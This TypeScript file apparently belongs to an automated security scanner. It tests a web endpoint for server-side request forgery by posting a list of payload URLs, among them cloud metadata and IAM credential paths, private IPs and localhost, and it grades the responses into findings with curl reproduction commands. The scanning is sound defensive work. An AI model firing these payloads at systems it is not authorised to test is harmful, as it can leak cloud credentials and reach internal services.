import { request } from 'undici'
import { type JudgeContext, type Finding } from '../types/index.js'
import { assertAllowedUrl } from '../safety/url_guard.js'

export const TEST_SSRF_SCHEMA = {
  type: 'object',
  properties: {
    endpoint: {
      type: 'string',
      description: 'Endpoint with URL parameter to test (e.g., /api/fetch)',
    },
    urlParam: {
      type: 'string',
      description: 'Parameter name that accepts a URL (e.g., redirect_url, webhook, imageUrl)',
    },
    token: {
      type: 'string',
      description: 'Auth token (optional)',
    },
  },
  required: ['endpoint', 'urlParam'],
}

const SSRF_PAYLOADS = [
  { url: 'http://169.254.169.254/latest/meta-data/', desc: 'AWS metadata' },
  { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'AWS IAM credentials' },
  { url: 'http://100.100.100.200/latest/meta-data/', desc: 'Alibaba Cloud metadata' },
  { url: 'http://metadata.google.internal/computeMetadata/v1/', desc: 'GCP metadata' },
  { url: 'http://192.168.1.1/', desc: 'Private IP 192.168.1.1' },
  { url: 'http://10.0.0.1/', desc: 'Private IP 10.0.0.1' },
  { url: 'http://localhost/', desc: 'localhost' },
  { url: 'http://[::1]/', desc: 'IPv6 localhost' },
]

export async function testSsrf(
  input: { endpoint: string; urlParam: string; token?: string },
  ctx: JudgeContext
): Promise<string> {
  if (!['internal', 'commercial'].includes(ctx.persona)) {
    return `test_ssrf: skipped (persona=${ctx.persona}, requires internal or commercial)`
  }

  const findings: Finding[] = []
  const results: string[] = []
  const targetUrl = `${ctx.targetBaseUrl}${input.endpoint}`
  assertAllowedUrl(targetUrl, ctx.allowedUrls)

  const headers: Record<string, string> = { 'Content-Type': 'application/json' }
  if (input.token) headers['Authorization'] = `Bearer ${input.token}`

  // Classify each payload into the strongest evidence tier it produced, then emit a
  // SINGLE finding per endpoint (the endpoint has one SSRF flaw — the payloads are
  // interchangeable exploits of it, not separate vulnerabilities).
  interface Hit { desc: string; url: string; snippet: string }
  const metadataHits: Hit[] = []
  const proxiedHits: Hit[] = []
  const attemptedHits: Hit[] = []

  for (const payload of SSRF_PAYLOADS) {
    try {
      const body = JSON.stringify({ [input.urlParam]: payload.url })

      const res = await request(targetUrl, {
        method: 'POST',
        headers,
        body,
      })

      const responseBody = await res.body.text()
      results.push(`[${payload.desc}]: ${res.statusCode}`)

      const hasMetadataLeak = /ami-id|instance-id|security-credentials|computeMetadata/i.test(responseBody)
      // The server tried to reach the injected internal host: a *network-level* error
      // surfaced in the response proves the app performed the outbound connection
      // instead of refusing it — i.e. no SSRF egress filtering. A bare 5xx status is
      // NOT sufficient (LB/rate-limit/unrelated crash also produce it); we require an
      // explicit connection-failure signature echoed from the server-side fetch.
      const attemptedOutbound =
        /ECONNREFUSED|ETIMEDOUT|EHOSTUNREACH|ENETUNREACH|EAI_AGAIN|getaddrinfo|ECONNRESET|socket hang up|connection refused|network unreachable|\btimed?\s?out\b|\btimeout\b/i.test(responseBody)

      const is2xx = res.statusCode >= 200 && res.statusCode < 300
      const hit: Hit = { desc: payload.desc, url: payload.url, snippet: responseBody.slice(0, 300) }
      if (is2xx && hasMetadataLeak) metadataHits.push(hit)
      else if (is2xx) proxiedHits.push(hit)
      else if (attemptedOutbound) attemptedHits.push(hit)
    } catch (err) {
      results.push(`[${payload.desc}]: ERROR`)
    }
  }

  const curl = (h: Hit) => `curl -X POST '${targetUrl}' -d '{"${input.urlParam}": "${h.url}"}'`
  const listVectors = (hits: Hit[]) => hits.map(h => h.desc).join(', ')

  if (metadataHits.length > 0) {
    findings.push({
      severity: 'CRITICAL',
      category: 'C',
      description: `SSRF confirmed on ${input.endpoint} — response contains cloud metadata (${metadataHits.length} vector(s): ${listVectors(metadataHits)})`,
      evidence: `${curl(metadataHits[0])}\nResponse: ${metadataHits[0].snippet}`,
      isFail: true,
      baseDeduction: 10,
      toolName: 'test_ssrf',
      owaspCategory: 'A10:2021',
      cweId: 'CWE-918',
      confidence: 'HIGH',
    })
  } else if (proxiedHits.length > 0) {
    findings.push({
      severity: 'HIGH',
      category: 'C',
      description: `Possible SSRF on ${input.endpoint} — server fetched the attacker-supplied internal URL and returned its response (${proxiedHits.length} vector(s): ${listVectors(proxiedHits)})`,
      evidence: `${curl(proxiedHits[0])}\nResponse: ${proxiedHits[0].snippet}`,
      isFail: false,
      baseDeduction: 10,
      toolName: 'test_ssrf',
      owaspCategory: 'A10:2021',
      cweId: 'CWE-918',
      confidence: 'HIGH',
    })
  } else if (attemptedHits.length > 0) {
    findings.push({
      severity: 'HIGH',
      category: 'C',
      description: `Possible SSRF on ${input.endpoint} — server attempted an outbound connection to the injected internal host, no egress filtering (${attemptedHits.length} vector(s): ${listVectors(attemptedHits)})`,
      evidence: `${curl(attemptedHits[0])}\nResponse: ${attemptedHits[0].snippet}`,
      isFail: false,
      baseDeduction: 10,
      toolName: 'test_ssrf',
      owaspCategory: 'A10:2021',
      cweId: 'CWE-918',
      confidence: 'MEDIUM',
    })
  }

  ctx.findings.push(...findings)
  return `test_ssrf on ${input.endpoint}?${input.urlParam}=...\n${results.join('\n')}\nFindings: ${findings.length}`
}
